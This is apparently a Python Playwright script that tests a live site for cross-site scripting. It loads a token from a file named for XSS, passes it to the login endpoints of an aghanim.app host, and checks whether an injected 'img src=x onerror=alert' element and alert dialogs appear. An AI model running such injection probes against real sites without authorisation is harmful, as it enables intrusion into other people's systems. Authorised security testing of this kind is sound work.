import asyncio,sys,json
from playwright.async_api import async_playwright
TOK=open("hub_tok_xss.txt").read().strip()
URLS=[f"https://wikipedia-i2yx.aghanim.app/go/login?token={TOK}",
      f"https://wikipedia-i2yx.aghanim.app/en/go/login?token={TOK}"]
async def main():
    dialogs=[]
    async with async_playwright() as p:
        b=await p.chromium.launch(headless=True,args=["--no-sandbox"])
        ctx=await b.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",viewport={"width":430,"height":900})
        pg=await ctx.new_page()
        pg.on("dialog", lambda d: (dialogs.append(d.message), asyncio.create_task(d.dismiss())))
        for u in URLS:
            try:
                await pg.goto(u,wait_until="domcontentloaded",timeout=45000)
                await pg.wait_for_timeout(7000)
            except Exception as e: print("goto:",str(e)[:80]); continue
            print("URL:",pg.url)
            txt=await pg.inner_text("body")
            print("  TEXT:",txt[:300].replace("\n"," | "))
            # look for injected img element with src=x
            found=await pg.evaluate("""()=>{
              const imgs=[...document.querySelectorAll('img')].filter(i=>i.getAttribute('src')==='x');
              return {count:imgs.length, html: imgs.map(i=>i.outerHTML).join('|').slice(0,200),
                      raw: document.body.innerHTML.includes('onerror=alert')};
            }""")
            print("  INJECTION:",json.dumps(found))
            print("  DIALOGS:",dialogs)
            await pg.screenshot(path="xss_check.png")
        await b.close()
asyncio.run(main())
